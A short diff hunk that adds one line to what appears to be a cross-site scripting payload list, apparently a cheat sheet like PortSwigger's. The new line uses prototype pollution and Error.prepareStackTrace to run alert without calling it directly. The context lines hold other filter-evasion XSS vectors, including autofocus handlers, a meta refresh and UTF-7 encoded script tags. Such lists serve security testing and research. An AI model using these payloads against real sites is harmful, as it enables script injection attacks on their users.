@@ -1411,6 +1411,7 @@ java&#00000000000009script:alert(1)
 <xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent('%61')+'lert'](1)>
 <xss tabindex=1 autofocus onfocus=defaultView['a'+[]+'lert'](1)>
 <xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>
+<script>Object.prototype.message='alert\\x281337\\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
